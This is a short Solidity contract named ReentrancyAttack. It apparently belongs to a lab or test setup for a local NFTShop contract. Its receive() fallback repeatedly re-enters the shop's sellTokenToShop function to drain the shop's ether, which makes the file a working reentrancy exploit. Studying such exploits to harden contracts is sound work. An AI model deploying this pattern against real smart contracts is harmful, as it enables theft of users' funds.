// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./NFTShop.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

contract ReentrancyAttack is ERC721Holder {
    NFTShop nFTShop;
    NFTToken nFTToken;

    constructor(address _shopAddress, address _tokenAddress) {
        nFTShop = NFTShop(_shopAddress);
        nFTToken = NFTToken(_tokenAddress);
    }

    function buyTokenFromShop(uint tokenId) external payable {
        uint tokenPriceForBuy = nFTShop.getTokenPriceForBuy();
        require(msg.value == tokenPriceForBuy, "ReentrancyAttack: not enough ethers for buy");
        nFTShop.buyTokenFromShop{value : msg.value}(tokenId);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address to, uint tokenId) public {
        nFTToken.approve(to, tokenId);
    }

    function sellTokenToShop(uint tokenId) public {
        nFTShop.sellTokenToShop(tokenId);
    }

    receive() external payable {
        if (nFTShop.getShopBalance() >= 100) {
            nFTShop.sellTokenToShop(1);
        }
    }
}
